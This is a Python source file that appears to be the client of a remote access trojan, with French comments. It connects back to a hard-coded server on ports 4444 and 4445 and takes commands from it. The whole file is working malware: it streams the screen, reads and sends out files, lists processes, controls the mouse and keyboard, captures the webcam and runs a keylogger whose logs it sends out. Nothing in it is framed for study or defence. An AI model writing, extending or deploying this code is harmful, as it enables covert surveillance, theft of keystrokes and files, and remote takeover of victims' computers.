import sys
import socket
import subprocess
import os
import pyautogui
import platform
import io
import time
import threading
from protocol import send_data, send_base64, receive_data
from modules import keylogger, screen_capture, file_manager, webcam

if getattr(sys, 'frozen', False):
    os.chdir(sys._MEIPASS)

SERVER_IP = "192.168.1.10"
PORT = 4444         # Commandes
PORT_VIDEO = 4445   # Flux vidéo

def connect_to_server(port):
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, port))
            return s
        except:
            time.sleep(5)

def stream_screen(s):
    try:
        while True:
            try:
                img = screen_capture.take_screenshot()
                print("[client] capture OK - taille:", len(img))
                send_base64(s, img)
                time.sleep(1/30)
            except Exception as e:
                print("[client] Erreur stream:", e)
                break
    except Exception as e:
        print("[client] Stream crashé :", e)
    finally:
        try:
            s.close()
        except:
            pass

def start_client():
    s_cmd = connect_to_server(PORT)
    s_video = connect_to_server(PORT_VIDEO)

    threading.Thread(target=stream_screen, args=(s_video,), daemon=True).start()

    while True:
        try:
            command = s_cmd.recv(1024).decode()

            if command == "shell":
                result = subprocess.getoutput("whoami")
                send_data(s_cmd, result)

            elif command == "screencap":
                img = screen_capture.take_screenshot()
                send_base64(s_cmd, img)

            elif command.startswith("listfiles"):
                path = command.split(" ", 1)[1] if " " in command else "."
                result = file_manager.list_directory(path)
                send_data(s_cmd, result)

            elif command == "process":
                cmd = "tasklist" if platform.system() == "Windows" else "ps aux"
                result = subprocess.getoutput(cmd)
                send_data(s_cmd, result)

            elif command.startswith("mouse_move"):
                try:
                    _, x, y, w, h = command.split()
                    screen_w, screen_h = pyautogui.size()
                    x = int(int(x) * screen_w / int(w))
                    y = int(int(y) * screen_h / int(h))
                    pyautogui.moveTo(x, y)
                except:
                    pass

            elif command == "click":
                pyautogui.click()

            elif command.startswith("type"):
                text = command.split(" ", 1)[1]
                pyautogui.write(text)

            elif command == "webcam":
                img = webcam.capture_webcam()
                send_base64(s_cmd, img if img else b"[Erreur webcam]")

            elif command == "keylogger_start":
                keylogger.start_keylogger()
                send_data(s_cmd, "[Keylogger démarré]")

            elif command == "keylogger_dump":
                logs = keylogger.get_logs()
                send_data(s_cmd, logs if logs else "[Aucune frappe détectée]")

            elif command.startswith("readfile"):
                path = command.split(" ", 1)[1] if " " in command else ""
                result = file_manager.read_file(path)
                send_base64(s_cmd, result)

            elif command == "exit":
                s_cmd.close()
                s_video.close()
                break

            else:
                send_data(s_cmd, "Commande inconnue.")
        except:
            s_cmd = connect_to_server(PORT)

if __name__ == "__main__":
    start_client()
